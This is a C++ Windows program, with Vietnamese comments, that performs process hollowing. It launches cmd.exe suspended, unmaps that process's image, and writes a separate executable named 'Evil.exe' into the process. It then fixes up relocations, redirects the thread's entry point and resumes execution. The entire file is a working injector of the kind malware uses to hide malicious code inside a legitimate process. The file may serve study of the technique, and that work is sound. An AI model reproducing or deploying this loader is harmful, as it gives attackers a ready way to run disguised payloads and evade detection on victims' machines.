#include <stdio.h>
#include <string.h>
#include <iostream>
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

typedef NTSTATUS(WINAPI* _NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

int main() {
    // Tạo tiến trình bị Hollow, process ở trạng thái treo (CREATE_SUSPEND)
    printf("CREATE_PROCESS\n");
    const char* pDestCmdLine = "C:\\Windows\\SysWOW64\\cmd.exe";
    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
    if (!CreateProcessA(NULL, (LPSTR)pDestCmdLine, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, pStartupInfo, pProcessInfo)) {
        printf("FAIL_CREATE_PROCESS\n");
        return 0;
    }
    HANDLE targetProc = pProcessInfo->hProcess;

    // Lấy ImageBaseAddress của tiến trình đích
    printf("GET_IMAGEBASEADDRESS\n");
    DWORD returnLength = 0;
    PROCESS_BASIC_INFORMATION *pbi = new PROCESS_BASIC_INFORMATION();
    _NtQueryInformationProcess myNtQueryInformationProcess = (_NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess"));
    if (myNtQueryInformationProcess(targetProc, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength)) {
        printf("NtQueryInformationProcess_FAIL\n");
        return 0;
    }
    DWORD pebImageBaseOffset = (DWORD)pbi->PebBaseAddress + 0x08;
    LPVOID targetImageBase = 0;
    SIZE_T byteRead = NULL;
    if (!ReadProcessMemory(targetProc, (LPCVOID)pebImageBaseOffset, &targetImageBase, 4, &byteRead)) {
        printf("FAIL_GET_IMAGEBASEADDRESS\n");
        return 0;
    }
    printf("Target Image Base: 0x%p\r\n", targetImageBase);

    // Đọc nội dung file nguồn muốn thực thi
    printf("READ_FILE_SRC\n");
    char* pSrcCmdLine = new char[MAX_PATH];
    GetModuleFileNameA(0, pSrcCmdLine, MAX_PATH);
    pSrcCmdLine[strrchr(pSrcCmdLine, '\\') - pSrcCmdLine + 1] = 0;
    strcat(pSrcCmdLine, "Evil.exe");
    HANDLE sourceFile = CreateFileA(pSrcCmdLine, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
    DWORD srcFileSize = GetFileSize(sourceFile, NULL);
    LPDWORD fileByteRead = 0;
    LPVOID srcFileByteBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, srcFileSize);
    if (!ReadFile(sourceFile, srcFileByteBuffer, srcFileSize, NULL, NULL)) {
        printf("FAIL_READ_FILE_SRC\n");
        return 0;
    }

    // Lấy SizeOfImage của file nguồn
    printf("GET_SizeOfImage_SRC\n");
    PIMAGE_DOS_HEADER srcImageDosHeader = (PIMAGE_DOS_HEADER)srcFileByteBuffer;
    PIMAGE_NT_HEADERS srcImageNTHeader = (PIMAGE_NT_HEADERS)((DWORD)srcFileByteBuffer + srcImageDosHeader->e_lfanew);
    SIZE_T srcSizeOfImage = srcImageNTHeader->OptionalHeader.SizeOfImage;

    // Loại bỏ Image tiến trình đích
    printf("UNMAP_OLD_IMAGE\n");
    _NtUnmapViewOfSection myNtUnmapViewOfSection = (_NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
    if (myNtUnmapViewOfSection(targetProc, targetImageBase)) {
        printf("NtUnmapViewOfSection_FAIL\n");
        return 0;
    }

    // Khởi tạo vùng nhớ mới ở Image của tiến trình đích cho Source Image, sau đó cần tính giá trị chênh lệch giữa ImageBase mới do chương trình tự biên dịch và ImageBase cũ
    printf("VIRTUALALLOCEX\n");
    if (!VirtualAllocEx(targetProc, targetImageBase, srcSizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) {
        printf("VirtualAllocEx_FAIL\n");
        return 0;
    }
    DWORD deltaImageBase = (DWORD)targetImageBase - srcImageNTHeader->OptionalHeader.ImageBase;
    printf("Delta Image Base: 0x%p\r\n", deltaImageBase);

    // Copy Image Header nguồn vào vùng nhớ đc khởi tạo ở tiến trình đích
    printf("WRITE_HEADER\n");
    srcImageNTHeader->OptionalHeader.ImageBase = (DWORD)targetImageBase;
    if (!WriteProcessMemory(targetProc, targetImageBase, srcFileByteBuffer, srcImageNTHeader->OptionalHeader.SizeOfHeaders, NULL)) {
        printf("FAIL_WRITE_HEADER\n");
        return 0;
    }
    
    // Copy Image Section nguồn
    printf("WRITE_SECTION\n");
    PIMAGE_SECTION_HEADER srcImageSection = (PIMAGE_SECTION_HEADER)((DWORD)srcFileByteBuffer + srcImageDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
    PIMAGE_SECTION_HEADER srcImageSectionOld = srcImageSection;
    for (int i = 0; i < srcImageNTHeader->FileHeader.NumberOfSections; i++) {
        PVOID targetSectionLocation = (PVOID)((DWORD)targetImageBase + srcImageSection->VirtualAddress);
        PVOID srcSectionLocation = (PVOID)((DWORD)srcFileByteBuffer + srcImageSection->PointerToRawData);
        printf("Writing %s section to 0x%p\r\n", srcImageSection->Name, targetSectionLocation);
        if (!WriteProcessMemory(targetProc, targetSectionLocation, srcSectionLocation, srcImageSection->SizeOfRawData, NULL)) {
            printf("FAIL_WRITE_SECTION\n");
            return 0;
        }
        srcImageSection++;
    }

    // BASE RELOCATION
    printf("BASE_RELOC\n");
    // lấy địa chỉ relocation table
    IMAGE_DATA_DIRECTORY relocTable = srcImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    srcImageSection = srcImageSectionOld;
    for (int i = 0; i < srcImageNTHeader->FileHeader.NumberOfSections; i++) {
        BYTE* relocSecName = (BYTE*)".reloc";
        if (memcmp(srcImageSection->Name, relocSecName, 6) != 0) {
            srcImageSection++;
            continue;
        }

        DWORD srcRelocTableRaw = srcImageSection->PointerToRawData;
        DWORD relocOffset = 0;
        while (relocOffset < relocTable.Size){
            printf("REBASE 0x%p\r\n", relocOffset + relocTable.VirtualAddress);
            PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)((DWORD)srcFileByteBuffer + srcRelocTableRaw + relocOffset);
            relocOffset += sizeof(BASE_RELOCATION_BLOCK);
            DWORD relocEntryCnt = (relocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
            PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((DWORD)srcFileByteBuffer + srcRelocTableRaw + relocOffset);

            for (DWORD y = 0; y < relocEntryCnt; y++) {
                relocOffset += sizeof(BASE_RELOCATION_ENTRY);
                if (relocEntries[y].Type == 0) {
                    continue;
                }
                DWORD patchAddr = relocBlock->PageAddress + relocEntries[y].Offset;
                DWORD patchBuf = 0;
                if (!ReadProcessMemory(targetProc, (LPCVOID)((DWORD)targetImageBase + patchAddr), &patchBuf, sizeof(DWORD), NULL)) {
                    printf("FAIL_READ_RELOC\n");
                    return 0;
                }
                printf("Relocating 0x%p -> 0x%p\r\n", patchBuf, patchBuf - deltaImageBase);
                patchBuf += deltaImageBase;
                if (!WriteProcessMemory(targetProc, (PVOID)((DWORD)targetImageBase + patchAddr), &patchBuf, sizeof(DWORD), NULL)) {
                    printf("FAIL_WRITE_RELOC\n");
                    return 0;
                }
            }
        }
    }

    // Lấy thông tin Thread
    printf("GET_THREAD\n");
    LPCONTEXT context = new CONTEXT();
    context->ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pProcessInfo->hThread, context)) {
        printf("FAIL_GET_THREAD\n");
        return 0;
    }   
    // Set EntryPoint cho Thread
    DWORD dwEntryPoint = (DWORD)targetImageBase + srcImageNTHeader->OptionalHeader.AddressOfEntryPoint;
    printf("Entry Point: 0x%p\r\n", dwEntryPoint);
    printf("SET_THREAD\n");
    context->Eax = dwEntryPoint;
    if (!SetThreadContext(pProcessInfo->hThread, context)){
        printf("FAIL_SET_THREAD\n");
        return 0;
    }
    // Resume Thread để chạy tiếp Process bị Suspend
    printf("RESUME_THREAD\n");
    if (!ResumeThread(pProcessInfo->hThread)){
        printf("FAIL_RESUME_THREAD\n");
        return 0;
    }
    system("pause");
    return 0;
}
